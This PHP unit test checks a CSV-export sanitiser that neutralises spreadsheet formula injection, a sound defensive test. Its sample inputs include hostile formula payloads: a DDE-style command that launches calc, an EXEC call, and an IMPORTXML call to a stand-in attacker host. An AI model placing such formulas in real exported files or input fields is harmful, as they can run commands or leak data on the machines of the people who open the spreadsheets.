<?php

namespace Tests\Unit;

use Tests\TestCase;

class SafeCsvTest extends TestCase
{
    private function sanitize(string $value): string
    {
        return preg_match('/^[\s]*[=+\-@]/u', $value) ? "'" . $value : $value;
    }

    public function test_safe_csv_neutralizes_formula_injection_attempts(): void
    {
        // Malicious payloads starting with =, +, -, @
        $this->assertSame("'=1+1", $this->sanitize("=1+1"));
        $this->assertSame("'=cmd|' /C calc'!A0", $this->sanitize("=cmd|' /C calc'!A0"));
        $this->assertSame("'+SUM(1,2)", $this->sanitize("+SUM(1,2)"));
        $this->assertSame("'-5+10", $this->sanitize("-5+10"));
        $this->assertSame("'@IMPORTXML('http://evil.test')", $this->sanitize("@IMPORTXML('http://evil.test')"));

        // Payload with leading whitespace
        $this->assertSame("'   =EXEC('calc')", $this->sanitize("   =EXEC('calc')"));
        $this->assertSame("'\t-malicious", $this->sanitize("\t-malicious"));

        // Safe values should NOT be prefixed
        $this->assertSame('Ahmad Dahlan', $this->sanitize('Ahmad Dahlan'));
        $this->assertSame('user@example.test', $this->sanitize('user@example.test'));
        $this->assertSame('12345678', $this->sanitize('12345678'));
    }
}
